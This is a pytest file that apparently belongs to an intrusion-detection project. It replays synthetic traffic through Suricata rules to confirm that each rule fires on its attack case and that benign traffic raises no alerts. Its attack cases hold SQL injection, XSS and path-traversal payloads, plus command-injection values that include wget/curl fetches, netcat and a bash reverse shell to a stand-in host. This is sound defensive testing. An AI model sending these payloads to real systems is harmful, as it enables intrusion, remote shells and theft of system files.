"""Replay generated traffic through rules/local.rules with Suricata (issue #85).

Every rule needs an attack case that makes it alert, and the benign cases
must not alert on anything. Suricata reads a pcap here; nothing touches the
host firewall. Tests that need Suricata are skipped when it isn't installed,
unless VAJRA_RULE_TESTS is set, as it is in CI.
"""

import json
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
from scapy.utils import wrpcap

import packets

ROOT = Path(__file__).resolve().parents[2]
RULES = ROOT / "rules" / "local.rules"
CONFIG = ROOT / "config" / "suricata" / "suricata.yaml"
ATTACKER = "198.51.100.20"
VISITOR = "203.0.113.30"
MIRROR = "203.0.113.80"

# One request per rule that the rule is written to catch
ATTACKS = {
    2000001: "/products?id=1%20UNION%20SELECT%20password%20FROM%20users",
    2000002: "/products?id=1%27",
    2000004: "/products?id=1--",
    2000005: "/login?user=x%20or%201=1",
    2000006: "/products?id=1%20and%20sleep(5)",
    2000010: "/search?q=<script>alert(1)</script>",
    2000011: "/search?q=%3cscript%3ealert(1)",
    2000012: "/search?q=<body%20onload=alert(1)>",
    2000013: "/search?q=<x%20onerror=alert(1)>",
    2000014: "/redirect?to=javascript:alert(1)",
    2000015: "/search?q=<img%20src=x>",
    2000016: "/search?q=<svg>",
    2000017: "/search?q=<a%20onclick=alert(1)>",
    2000020: "/download?file=../../app/config.php",
    2000021: "/download?file=%2e%2e%2fconfig.php",
    2000022: "/download?file=/etc/passwd",
    2000023: "/download?file=/etc/shadow",
    2000024: "/download?file=..\\..\\app\\config.php",
    2000025: "/download?file=c:/boot.ini",
    2000026: "/download?file=c:/windows/win.ini",
    2000030: "/ping?host=x%3bwget%20http://198.51.100.7/x",
    2000031: "/ping?host=x%3bcurl%20http://198.51.100.7/x",
    2000032: "/ping?host=x%3bwhoami",
    2000033: "/ping?host=x%3b/bin/sh%20-i",
    2000034: "/ping?host=x%3b/bin/bash%20-i",
    2000035: "/ping?host=x%3bnc%20198.51.100.7%204444",
    2000036: "/ping?host=x%3bbash%20-i%20>%26/dev/tcp/198.51.100.7/4444",
    2000037: "/ping?host=x%3bcat%20/etc/hostname",
    2000038: "/ping?host=127.0.0.1|ls",
    2000039: "/ping?host=127.0.0.1;ls",
}

# http.uri is the decoded URI, so content that looks for percent encoding never matches
NEVER_MATCH = {2000002: "#93", 2000011: "#93", 2000021: "#93"}

# Rules that count traffic from one source over a few seconds. The UDP and HTTP flood rules match once per
# flow, so they count new UDP flows and new HTTP connections, not packets.
REPEATED = {
    2000040: packets.probes(ATTACKER, range(1, 101), "S"),
    2000041: packets.probes(ATTACKER, range(1, 101), "F"),
    2000042: packets.probes(ATTACKER, range(1, 101), "FPU"),
    2000043: packets.probes(ATTACKER, range(1, 101), ""),
    2000050: packets.probes(ATTACKER, [80] * 150, "S"),
    2000051: packets.udp_stream(ATTACKER, 300, 9999, gap=0.002, new_port_each=True),
    2000052: packets.pings(ATTACKER, 100, gap=0.005),
    2000053: packets.repeated(lambda start: packets.http(ATTACKER, "/", start=start), 40, 0.02),
    2000060: packets.repeated(lambda start: packets.ssh(ATTACKER, start=start), 5, 2.0),
    2000061: packets.repeated(
        lambda start: packets.tcp_session(ATTACKER, packets.SERVER, 21, b"USER root\r\n", b"220 ready\r\n", start),
        5,
        2.0,
    ),
    2000062: packets.repeated(
        lambda start: packets.tcp_session(ATTACKER, packets.SERVER, 3389, bytes(19), bytes(19), start), 5, 2.0
    ),
}

# Normal traffic: (name, packets, protocol Suricata must parse if it has a parser, alerts it raises today
# and the issue fixing them)
BENIGN = [
    ("home page", packets.http(VISITOR, "/"), "http", {}),
    ("search", packets.http(VISITOR, "/search?q=network+security+tools&page=2"), "http", {}),
    ("static file", packets.http(VISITOR, "/static/js/app.min.js?v=3.4.1"), "http", {}),
    ("api call", packets.http(VISITOR, "/api/v1/users/42?fields=name,email"), "http", {}),
    (
        "login form",
        packets.http(VISITOR, "/login", method="POST", body=b"user=alice&password=correct-horse"),
        "http",
        {},
    ),
    ("apostrophe in a search", packets.http(VISITOR, "/search?q=o%27reilly"), "http", {}),
    ("double dash in a path", packets.http(VISITOR, "/docs/install--linux"), "http", {2000004: "#93"}),
    ("curl in a file name", packets.http(VISITOR, "/downloads/curl-8.10.1.tar.gz"), "http", {2000031: "#93"}),
    (
        "wordpress heartbeat",
        packets.http(VISITOR, "/wp-admin/admin-ajax.php?action=heartbeat&_nonce=a1b2c3"),
        "http",
        {},
    ),
    ("apt update", packets.http(packets.SERVER, "/ubuntu/dists/noble-updates/InRelease", server=MIRROR), "http", {}),
    (
        "apt downloads the curl package",
        packets.http(packets.SERVER, "/ubuntu/pool/main/c/curl/curl_8.5.0-2ubuntu10.6_amd64.deb", server=MIRROR),
        "http",
        {2000031: "#93"},
    ),
    ("ssh connection", packets.ssh(VISITOR), "ssh", {}),
    ("dns lookup", packets.dns(VISITOR, "www.example.com.", "93.184.215.14"), "dns", {}),
    ("ping", packets.pings(VISITOR, 4, gap=1.0), None, {}),
    (
        "three page loads of six connections",
        packets.repeated(lambda start: packets.http(VISITOR, "/", start=start), 18, 0.12),
        "http",
        {2000040: "#90", 2000053: "#92"},
    ),
    (
        "ansible opening three ssh connections",
        packets.repeated(lambda start: packets.ssh(VISITOR, start=start), 3, 5.0),
        "ssh",
        {2000060: "#91"},
    ),
    ("300 KB upload", packets.http(VISITOR, "/upload", method="POST", body=bytes(300_000)), "http", {}),
    ("wireguard peer", packets.udp_stream(VISITOR, 400, 51820, gap=0.004), None, {}),
    (
        "dns client sending 250 lookups in 2 seconds",
        packets.repeated(
            lambda start: packets.dns(VISITOR, "www.example.com.", "93.184.215.14", start=start), 250, 0.008
        ),
        "dns",
        {2000051: "#92"},
    ),
]


def rule_sids():
    sids = set()
    for line in RULES.read_text().splitlines():
        match = re.search(r"\bsid:\s*(\d+)\s*;", line)
        if match and not line.lstrip().startswith("#"):
            sids.add(int(match.group(1)))
    return sids


def replay(traffic, workdir):
    """Run Suricata over the packets and return the eve.json events"""
    suricata = shutil.which("suricata")
    if not suricata:
        if os.environ.get("VAJRA_RULE_TESTS"):
            pytest.fail("suricata is not installed")
        pytest.skip("suricata is not installed")
    pcap = workdir / "traffic.pcap"
    wrpcap(str(pcap), sorted(traffic, key=lambda packet: packet.time))
    result = subprocess.run(
        [
            suricata,
            "-c",
            str(CONFIG),
            "-S",
            str(RULES),
            "-r",
            str(pcap),
            "-k",
            "none",
            "-l",
            str(workdir),
            "--init-errors-fatal",
        ],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    return [json.loads(line) for line in (workdir / "eve.json").read_text().splitlines()]


def alerts(events):
    return {e["alert"]["signature_id"] for e in events if e.get("event_type") == "alert"}


def test_every_rule_has_an_attack_case():
    sids = rule_sids()
    assert sids - set(ATTACKS) - set(REPEATED) == set(), "add an attack case for these rules"
    assert set(ATTACKS) | set(REPEATED) <= sids, "these cases are for rules that no longer exist"


@pytest.mark.parametrize(
    "sid",
    [
        pytest.param(sid, marks=pytest.mark.xfail(strict=True, reason=f"never matches, {NEVER_MATCH[sid]}"))
        if sid in NEVER_MATCH
        else sid
        for sid in [*ATTACKS, *REPEATED]
    ],
)
def test_rule_alerts_on_its_attack(sid, tmp_path):
    traffic = REPEATED[sid] if sid in REPEATED else packets.http(ATTACKER, ATTACKS[sid])
    assert sid in alerts(replay(traffic, tmp_path))


@pytest.mark.parametrize("name, traffic, protocol, known", BENIGN, ids=[case[0] for case in BENIGN])
def test_normal_traffic_does_not_alert(name, traffic, protocol, known, tmp_path):
    events = replay(traffic, tmp_path)
    flows = [e for e in events if e.get("event_type") == "flow"]
    assert flows, "Suricata saw no traffic"
    if protocol:
        assert any(e.get("app_proto") == protocol for e in flows), f"Suricata didn't parse the traffic as {protocol}"
    assert alerts(events) == set(known)
